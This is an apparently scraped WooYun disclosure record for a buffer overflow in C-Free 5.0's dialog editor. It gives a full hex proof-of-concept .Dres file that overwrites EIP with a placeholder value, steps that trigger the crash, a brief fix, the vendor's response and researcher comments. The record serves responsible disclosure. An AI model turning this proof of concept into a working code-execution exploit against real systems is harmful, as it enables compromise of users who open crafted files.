{"id": 3824, "wybug_id": "wooyun-2014-052870", "wybug_title": "c-Free 5.0 对话框编辑器 缓冲区溢出漏洞", "wybug_corp": "c-Free", "wybug_author": "光刃", "wybug_date": "2014-03-05 17:48", "wybug_open_date": "2014-06-03 17:48", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-03：\t细节向公众公开  简要描述： 未对长度进行检测，造成缓冲区溢出。EIP可控。攻击者可以构造特定的.Dres文件，即可利用此漏洞执行任意想执行的程序。程序名称：dlgedit.exe版本信息：Microsoft Dialog Editor Version 3.10.200 详细说明：  poc：把下面数据以16进制的形式保存在文件中（大小为740H) 偏移656H处（我这里写的是CCCCCCCC）就是我们要修改的EIP地址\n0000000020000000FFFF0000FFFF0000000000000000000000000000000000000007000020000000FFFF0500FFFF640000000000301000000000000000000000C000C890000000000000060012001C01B00000000000610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131CCCCCCCC3131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131316100000008004D00530020005300680065006C006C00200044006C0067000000\n   漏洞证明：  文件偏移656H处为要修改的EIP，这里我们用cccccccc实验第一步 打开我们构造的文件，打开后稍微移动一下对话框\n\n第二步 选择EDIT-STYLES（或者Ctrl+Y)  然后取消。然后就触发了\n\n我们发现EIP已经是我们要设置的CCCCCCCC了\n\n\n\n   修复方案：  检测大小   版权声明：转载请注明来源 光刃@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-03-10 21:19 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-05 17:58 |    \t\t小驴牙牙 \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:43        | 不断学习，进步！)\t\t \n  又是溢出    \n     2014-03-05 18:09 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  @小驴牙牙 别的不会啊    \n     2014-03-05 18:19 |    \t\t飞扬风 \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:125        | 追求安全，热爱技术)\t\t \n  溢出牛！！    \n     2014-03-05 18:20 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  挖XP的吧，你懂的    \n     2014-03-05 18:24 |    \t\t小驴牙牙 \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:43        | 不断学习，进步！)\t\t \n  挖win8吧，教主的节奏！    \n     2014-03-05 20:55 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  大牛专注溢出    \n     2014-03-07 14:24 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  14年3月7日补充：在漏洞证明第二步中:若win7等环境，有时候移动窗口后 EDIT-STYLES（或者Ctrl+Y)依然是灰色。不能点击。这时候可以在窗口随意加一个小控件。这时候 EDIT-STYLES 就变成黑色了，就可以触发漏洞了。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}